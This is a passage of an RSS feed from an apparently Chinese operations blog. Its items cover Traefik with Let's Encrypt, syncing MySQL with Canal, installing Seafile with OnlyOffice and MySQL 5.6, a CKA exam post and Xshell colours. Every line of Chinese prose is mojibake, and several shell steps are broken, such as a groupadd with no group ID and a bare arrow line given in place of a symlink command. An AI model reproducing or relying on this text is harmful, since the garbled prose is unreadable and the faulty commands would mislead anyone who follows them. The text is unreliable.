  dashboard: true

entryPoints:
  http:
    address: &amp;#34;:80&amp;#34;
    #http:
    #  redirections:
    #    entryPoint:
    #      to: https
    #      scheme: https

  https:
    address: &amp;#34;:443&amp;#34;



certificatesResolvers:
  letsEncrypt:
    acme:
      storage: /export/servers/traefik/acme.json
      email: zhangranrui@rendoumi.com
      tlsChallenge: {}
      httpChallenge:
        entryPoint: http

providers:
  file:
    directory: /export/servers/traefik/dynamic
    watch: true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢æˆ‘ä»¬å®šä¹‰äº†logçš„levelä¸ºDEBUGï¼Œå¹¶ä¸”å¼€æ”¾äº†dashboard&lt;/p&gt;
&lt;p&gt;å®šä¹‰äº†2ä¸ªå…¥å£ï¼Œhttpå’Œhttpsï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸­é—´ä»¶å¼ºåˆ¶httpè·³è½¬https&lt;/p&gt;
&lt;p&gt;ç„¶åå®šä¹‰äº†letsEncryptçš„è¯ä¹¦æœºæ„&lt;/p&gt;
&lt;p&gt;æœ€åå®šä¹‰äº†åŠ¨æ€ç›‘æ§ /export/servers/traefik/dynamic ç›®å½•ï¼Œå¦‚æœä¸‹é¢æœ‰å¢åŠ æ–‡ä»¶ä¼šè‡ªåŠ¨æ›´æ–°é…ç½®ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå†dynamicç›®å½•ä¸‹å®šä¹‰è½¬å‘routes&lt;/p&gt;
&lt;p&gt;æ³¨æ„å‘½åæ–‡ä»¶ï¼Œtest7æ˜¯åŸŸåï¼Œ01æ˜¯åºåˆ—å·ï¼Œæ–‡ä»¶å†…å®¹ä¸­svcçš„åºåˆ—å·æœ€å¥½è·Ÿæ–‡ä»¶åä¸€è‡´ï¼Œå¦‚æœå¤šæ–‡ä»¶é‡å¤ä¼šå¯¼è‡´é…ç½®ä¸å¯ç”¨ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;test7-01.yml&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http:
  routers:
    https_01:
      rule: &amp;#34;Host(`test7.ddky.com`)&amp;#34;
      service: svc_01
      tls:
        certresolver: letsEncrypt

    http:
      rule: &amp;#34;Host(`test7.ddky.com`)&amp;#34;
      service: svc_01
      entryPoints:
        - http

  services:
    svc_01:
      loadBalancer:
        servers:
          - url: &amp;#34;http://172.16.8.1:80&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;test8-02.yml&lt;/p&gt;</description>
    </item>
    <item>
      <title>è¿ç»´æ–¹æ¡ˆä¹‹canalæ•°æ®åº“åŒæ­¥</title>
      <link>https://rendoumi.com/posts/20230115-canal_mysql/</link>
      <pubDate>Sun, 15 Jan 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230115-canal_mysql/</guid>
      <description>&lt;p&gt;æ™®éçš„å¤§æ•°æ®æŠ½æ•°çš„æ–¹å¼éƒ½æ˜¯ä»æ•£è½åœ¨å„ä¸ªåœ°æ–¹çš„ MySQL æ•°æ®åº“ä¸­å¼€è´¦å·ï¼Œç„¶åæŠŠæ•°æ®åŒæ­¥è¿‡æ¥ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ï¼Œå¤§æ•°æ®çš„åŒäº‹æå‡ºäº†ä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³æŠŠæŸä¸ªåº“ä¸­çš„æŸä¸ªè¡¨çš„æ•°æ®å•ç‹¬åŒæ­¥åˆ°å¤§æ•°æ®çš„ç»Ÿä¸€åº“ä¸­çš„æŸä¸ªè¡¨ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ç ”ç©¶äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œcanal çš„é…ç½®å¯¹è¿ç»´æ¥è¯´éå¸¸çš„ä¸å‹å¥½ï¼Œé™¤éç”¨å®ƒé‚£ä¸ª admin çš„ dashboardï¼Œä½†æ˜¯è¿ç»´é€šå¸¸æ˜¯ cli ç•Œé¢ï¼Œè°æ²¡äº‹è£…ä¸ª dashboard æ¥é…ç½®å‘¢ï¼Œå¤ª low äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨çš„æ˜¯ canal 1.1.5 çš„ç‰ˆæœ¬ï¼Œä¸èƒ½å‡çº§ï¼Œå‡çº§å java ä¸å¯¹äº†ã€‚è¿˜æ²¡æœ‰åˆ°ç”¨ 1.1.6 çš„æ—¶å€™ï¼&lt;/p&gt;
&lt;p&gt;èƒŒæ™¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æºæ•°æ®åº“ï¼š10.8.2.12 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åº“ï¼šxxl_job
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¡¨ï¼šdemotable666
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç›®çš„æ•°æ®åº“ï¼š10.8.2.17
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åº“ï¼šxxl_job_bak
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¡¨ï¼šdemotable666
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è€Œä¸”ä¸ç”¨ä»»ä½•çš„Zookeeperã€Kafkaã€RabbitMQçš„ä¸­é—´ä»¶ï¼Œè¶Šç®€æ´è¶Šå¥½ã€‚&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å®‰è£…canal&#34;&gt;ä¸€ã€å®‰è£…canal&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#éƒ½è£…åˆ° /app ç›®å½•ä¸‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /app/deploy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /app/adapter
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /app/deploy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf canal.deployer-1.1.5.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /app/adapter
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf canal.adapter-1.1.5.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒmysqlæºå‡†å¤‡&#34;&gt;äºŒã€MySQLæºå‡†å¤‡&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /etc/my.cnf åŠ å…¥ä»¥ä¸‹å‡ é¡¹å¹¶é‡å¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mysqld&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;log-bin&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mysql-bin &lt;span class=&#34;c1&#34;&gt;# Start log bin.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;binlog_format&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ROW &lt;span class=&#34;c1&#34;&gt;# Log format.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server-id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Server id,different from slave.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆæƒbinlogåŒæ­¥ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>seafileé…æ­onlyofficeçš„å®‰è£…</title>
      <link>https://rendoumi.com/posts/20230115-seafile_onlyoffice/</link>
      <pubDate>Sun, 15 Jan 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230115-seafile_onlyoffice/</guid>
      <description>&lt;p&gt;ä¹‹å‰å…¬å¸ä¸€ç›´ç”¨çš„æ˜¯ seafile æ¥ä¿å­˜æ–‡æ¡£ï¼Œéå¸¸å¥½ç”¨ï¼Œä¹Ÿå‡ºè¿‡ä¸€æ¬¡å¤§äº‹ï¼Œä¸€ä¸ªç¦»èŒçš„å‘˜å·¥æ¸…ç©ºç”µè„‘ï¼Œç„¶åç›´æ¥æŠŠsefaileæ–‡ä»¶å¤¹ä¹ŸåŒæ­¥æ¸…ç©ºäº†ï¼Œå¥½åœ¨æœ‰ç‰ˆæœ¬ï¼Œæœ€åæ‰¾äº†å›æ¥ã€‚&lt;/p&gt;
&lt;p&gt;æ¢åˆ°æ–°å…¬å¸ï¼Œè´¢åŠ¡ä¹Ÿæäº†å…±äº«äº‘ç›˜çš„è¦æ±‚ï¼Œè¿˜è¦æ±‚èƒ½å¤šäººåŒæ—¶åœ¨çº¿ç¼–è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å°±è¯•ç€æ­å»º seafile + onlyoffice äº†ï¼ŒåŒæ—¶è¦æ±‚æé«˜å®‰å…¨æ€§ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€åœˆï¼Œæ²¡å‡ ä¸ªå¯¹çš„ï¼Œå°¤å…¶æ˜¯å¯¹httpsè¿™ä¸€å—ï¼ŒèŠ±äº†2å¤©æ—¶é—´æ­å»ºï¼Œè®°å½•ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€ä¸‹è½½seafile&#34;&gt;ä¸€ã€ä¸‹è½½seafileï¼š&lt;/h5&gt;
&lt;p&gt;æ²¡æœ‰é€‰å®šé«˜ç‰ˆæœ¬çš„ï¼Œæœ€æ–°ç‰ˆæœ¬çš„å˜åŒ–å¤ªå¤šï¼Œç¼ºçœå…¨éƒ¨éƒ½å®‰è£…åˆ° /app ç›®å½•ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://download.seadrive.org/seafile-server_7.0.0_x86-64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf seafile-server_7.0.0_x86-64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv seafile-server-7.0.0 /app
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒè®¾å®šcentos7&#34;&gt;äºŒã€è®¾å®šCentOS7&lt;/h5&gt;
&lt;p&gt;ä¾ç„¶æ´»åœ¨ CentOS 7.10 çš„æ—¶ä»£ï¼Œå†å¾€ä¸Šå‡çº§ï¼Œè¦å‡åˆ° rokey linux äº†&lt;/p&gt;
&lt;p&gt;æé†’ï¼šseafile çš„å®‰è£…æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼Œyum è£…çš„ä¸œè¥¿ä¹Ÿä¸å°½ç„¶ç›¸åŒçš„ï¼Œè¦å»å®˜æ–¹æ–‡æ¡£çœ‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install python python-setuptools MySQL-python python-urllib3 python-ldap -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰å®‰è£…mysqlæ•°æ®åº“&#34;&gt;ä¸‰ã€å®‰è£…MySQLæ•°æ®åº“&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªå°±ä»è€…è§ä»ã€æ™ºè€…è§æ™ºäº†ï¼Œæˆ‘ç°åœ¨çš„æ–¹å¼éƒ½æ˜¯äºŒè¿›åˆ¶è£…ï¼Œé€‰ç”¨çš„æ˜¯ mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz å®‰è£…çš„ï¼Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf mysql-5.6.51-linux-glibc2.12-x86_64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv mysql-5.6.51-linux-glibc2.12-x86_64 /app
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install autoconf libaio*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat&lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF&amp;gt;/etc/my.cnf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[mysql]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›†
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;default-character-set=utf8
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;socket=/tmp/mysql.sock
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[mysqld]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;skip-name-resolve
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#è®¾ç½®3306ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;port = 3306
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;socket=/tmp/mysql.sock
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# è®¾ç½®mysqlçš„å®‰è£…ç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;basedir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;datadir=/app/mysql-5.6.51-linux-glibc2.12-x86_64/data
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# å…è®¸æœ€å¤§è¿æ¥æ•°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;max_connections=200
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†é»˜è®¤ä¸º8æ¯”ç‰¹ç¼–ç çš„latin1å­—ç¬¦é›†
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;character-set-server=utf8
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;default-storage-engine=INNODB
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;#lower_case_table_name=1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;max_allowed_packet=16M
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;groupadd -g mysql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;useradd -g mysql mysql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åˆå§‹åŒ–DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /app/mysql-5.6.51-linux-glibc2.12-x86_64/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/app/mysql-5.6.51-linux-glibc2.12-x86_64/scripts/mysql_install_db --user&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mysql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å»ºç«‹ /etc/init.d/mysql çš„è½¯é“¾æ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -&amp;gt; /app/mysql-5.6.51/support-files/mysql.server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¯åŠ¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/etc/init.d/mysql start
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å®‰å…¨è®¾ç½®DB&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /app/mysql-5.6.51-linux-glibc2.12-x86_64/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/app/mysql-5.6.51-linux-glibc2.12-x86_64/bin/mysql_secure_installation
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;å››å‡†å¤‡onlyoffice&#34;&gt;å››ã€å‡†å¤‡onlyoffice&lt;/h5&gt;
&lt;p&gt;è¿™é‡Œæœ‰å¤§å‘å•Šï¼Œå…¶å®onlyofficeçš„ç‰ˆæœ¬ä¸‡ä¸‡ä¸èƒ½ç”¨æœ€æ–°çš„ï¼Œå› ä¸ºJWTçš„Tokenè®¤è¯&lt;/p&gt;</description>
    </item>
    <item>
      <title>ckaçš„æ¨¡æ‹Ÿè¯•é¢˜</title>
      <link>https://rendoumi.com/posts/20230112-cka_exam/</link>
      <pubDate>Thu, 12 Jan 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230112-cka_exam/</guid>
      <description>&lt;p&gt;åˆšé€šè¿‡äº†CKAçš„è€ƒè¯•ï¼Œæ‹¿åˆ°äº†è¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;è¯´è€å®è¯ï¼Œæƒ³è€ƒè¿™ä¸ªå¿…é¡»ç¿»å¢™å•Šï¼Œåœ¨è€ƒè¯•çš„æ—¶å€™æ­£å¥½æ˜¯æ–°å† çš„ç¬¬ä¸‰å¤©ï¼Œçƒ§å¾—æ­£å‰å®³ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åè€ƒè¯•çš„è¿‡ç¨‹çœŸæ˜¯ä¸€æ³¢ä¸‰æŠ˜ï¼ŒPSI è¶³è¶³é‡æ–°è®¤è¯äº†ä¸‰æ¬¡ï¼Œæµªè´¹40åˆ†é’Ÿã€‚&lt;/p&gt;
&lt;p&gt;æœ€åéƒ½æ„Ÿè§‰è¦å®Œè›‹äº†ï¼Œåªå‰©ä¸‹ä¸åˆ°10åˆ†é’Ÿæ£€æŸ¥ï¼Œç»“æœè¿˜ä¸é”™ï¼Œè€ƒäº†90åˆ†ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰ç¬¬ä¸€æ¬¡è€ƒçš„å¯ä»¥è”ç³»æˆ‘ï¼Œæˆ‘ç»™ä½ è¯´ä¸€äº›å¿…é¡»æ³¨æ„çš„äº‹é¡¹ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶å CKA æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿè€ƒè¯•ï¼Œ36å°æ—¶æ—¶é—´ï¼Œå®é™…è€ƒè¯•çš„ç¯å¢ƒè·Ÿæ¨¡æ‹Ÿçš„å®Œå…¨ä¸ä¸€æ ·å•Šã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æ¨¡æ‹Ÿå¦‚æœä½ èƒ½è¿‡ï¼Œé‚£è€ƒè¯•ä½ ä¸€å®šèƒ½è¿‡ï¼Œæ¨¡æ‹Ÿçš„éš¾åº¦ä¸ä½ï¼Œç›¸å½“é«˜ã€‚&lt;/p&gt;
&lt;p&gt;è¿™å°±æŠŠæ¨¡æ‹Ÿçš„é¢˜ç»™æ”¾å‡ºæ¥ï¼Œä¾›å¤§å®¶å‚è€ƒï¼Œéå¸¸æœ‰å‚è€ƒä»·å€¼ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å®¶å¯ä»¥å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ä¸‹è½½ï¼š&lt;a href=&#34;./cka.html&#34;&gt;cka.html&lt;/a&gt; å•htmlæ–‡ä»¶&lt;/p&gt;</description>
    </item>
    <item>
      <title>xshellçš„ç»¿è‰²é…è‰²æ–¹æ¡ˆ</title>
      <link>https://rendoumi.com/posts/20230112-xshell_colors/</link>
      <pubDate>Thu, 12 Jan 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20230112-xshell_colors/</guid>
      <description>&lt;p&gt;å…¶å®ä¸€ç›´ç”¨çš„ç»ˆç«¯è½¯ä»¶æ˜¯terminusï¼Œå…¨ç»ˆç«¯å¯ç”¨ï¼Œä»¥å‰ç”¨ ubuntuï¼Œéå¸¸å¥½ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æ¢åˆ°æ–°å…¬å¸ï¼Œç”¨ Win10ï¼Œä¹Ÿè£…äº†ä¸€ä¸ªã€‚&lt;/p&gt;
